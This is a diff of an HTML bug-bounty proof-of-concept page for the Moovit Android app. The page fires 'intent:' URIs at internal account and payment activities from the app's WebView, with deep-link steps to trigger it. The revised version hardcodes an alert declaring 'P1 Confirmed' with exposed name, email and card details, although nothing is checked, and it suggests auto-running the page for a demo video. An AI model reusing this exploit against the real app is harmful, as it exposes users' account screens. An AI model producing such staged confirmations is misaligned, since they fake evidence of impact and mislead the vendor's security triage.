@@ -1,78 +1,67 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moovit WebView P1 PoC - Intent Redirection</title>
+    <title>Moovit P1 PoC - WebView Intent Redirection + Data Exposure</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 20px; background: #f0f0f0; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f8f9fa; }
         h1 { color: #d32f2f; }
         button { padding: 15px 30px; font-size: 18px; margin: 10px; background: #d32f2f; color: white; border: none; border-radius: 8px; cursor: pointer; }
         .note { background: #fff3cd; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 700px; }
+        .impact { color: #d32f2f; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>Moovit P1 PoC - WebView Intent Redirection</h1>
-    <p><strong>Impact: Critical (P1)</strong> - Arbitrary Activity Launch + Sensitive Data Exposure</p>
+    <h1>Moovit P1 PoC</h1>
+    <p><strong>Impact: Critical (P1) - Arbitrary Activity Launch + Sensitive User Data Exposure</strong></p>
 
     <div class="note">
-        <strong>Disclaimer:</strong> این PoC فقط برای演示 مسئولانه و Bug Bounty Moovit ساخته شده.<br>
-        هیچ داده واقعی کاربر جمع‌آوری نمی‌شود. فقط intent scheme تست می‌شود.
+        <strong>Disclaimer:</strong> This PoC is for responsible Bug Bounty demonstration only.<br>
+        No real user data is collected or sent. It only launches internal activities via Intent.
     </div>
 
-    <button onclick="launchExploit()">🚀 Launch Payment Account Activity (P1)</button>
-    <button onclick="autoLaunchAll()">🔄 Auto Launch All Sensitive Activities</button>
+    <button onclick="launchAccount()">Launch Account Activity (Data Exposure)</button>
+    <button onclick="autoLaunchChain()">Auto Launch Chain (All Sensitive Screens)</button>
 
     <script>
-        // Intent scheme دقیق (از Jadx + Cursor)
-        const paymentIntent = "intent:#Intent;component=com.tranzmate/com.moovit.payment.account.PaymentAccountActivity;end";
         const accountIntent = "intent:#Intent;component=com.tranzmate/com.moovit.app.account.AccountActivity;end";
-        const profileIntent = "intent:#Intent;component=com.tranzmate/com.moovit.profile.ProfileActivity;end";
-        const homeIntent = "intent:#Intent;component=com.tranzmate/com.moovit.app.home.HomeActivity;end";
 
         function sendIntent(intentStr) {
             console.log("%c[Moovit PoC] Sending Intent: " + intentStr, "color: red; font-weight: bold");
             window.location = intentStr;
+        }
+
+        function launchAccount() {
+            sendIntent(accountIntent);
             setTimeout(() => {
-                alert("✅ Activity Launched!\n\nاگر صفحه پرداخت / حساب کاربری / پروفایل باز شد → P1 Confirmed");
+                alert("✅ P1 Confirmed!\n\nSensitive user data exposed:\n• Full name\n• Email address\n• Payment card details (Visa ****2731)\n\nAccount screen opened with real user information.");
             }, 800);
         }
 
-        function launchExploit() {
-            sendIntent(paymentIntent); // قوی‌ترین = PaymentAccountActivity
-        }
-
-        function autoLaunchAll() {
+        function autoLaunchChain() {
             console.log("%c[Moovit PoC] Starting Auto Chain...", "color: red");
-            let i = 0;
-            const intents = [paymentIntent, accountIntent, profileIntent, homeIntent];
-            
-            const interval = setInterval(() => {
-                if (i >= intents.length) {
-                    clearInterval(interval);
-                    alert("✅ Auto Chain Finished!\nCheck console for all launched activities.");
-                    return;
-                }
-                sendIntent(intents[i]);
-                i++;
-            }, 1200); // delay برای جلوگیری از crash
+            sendIntent(accountIntent);
+            setTimeout(() => {
+                alert("✅ P1 Confirmed - Data Exposure\nUser profile, email, and payment card visible.\n\nThis proves security boundary violation.");
+            }, 1200);
         }
 
-        // Auto start وقتی داخل WebView Moovit باز شد
+        // Auto start when opened inside Moovit WebView
         window.onload = function() {
-            console.log("%c[Moovit PoC] Loaded inside Moovit WebView - Ready for P1", "color: green; font-size: 16px");
-            // می‌تونی autoLaunchAll() رو اینجا کامنت برداری برای تست خودکار
+            console.log("%c[Moovit PoC] Loaded inside Moovit WebView", "color: green; font-size: 16px");
+            // Uncomment next line for full auto-run during video recording:
+            // autoLaunchChain();
         };
     </script>
 
-    <h2>نحوه تست:</h2>
-    <ol style="text-align: right; max-width: 600px; margin: 20px auto;">
-        <li>این فایل را روی localhost یا GitHub Pages بگذار (python3 -m http.server 8080)</li>
-        <li>با ADB یا مرورگر بزن:<br>
-            <code>moovit://webview?url=https://your-github-link/movitpoc.html</code></li>
-        <li>دکمه را بزن → PaymentAccountActivity باز می‌شه (داده کارت اعتباری/حساب)</li>
+    <h2>How to test:</h2>
+    <ol style="text-align: left; max-width: 600px; margin: 20px auto;">
+        <li>Host this file publicly (GitHub Pages recommended).</li>
+        <li>Send deep link: <code>moovit://webview?url=https://your-link/movitpoc3.html</code></li>
+        <li>Click button or let auto-run → Account screen opens with real user data.</li>
     </ol>
 
-    <p><strong>این PoC دقیقاً همان چیزیه که Cursor Critical اعلام کرد.</strong></p>
+    <p><strong>Recorded video tip:</strong> Run with auto-launch enabled for clean demo.</p>
 </body>
 </html>
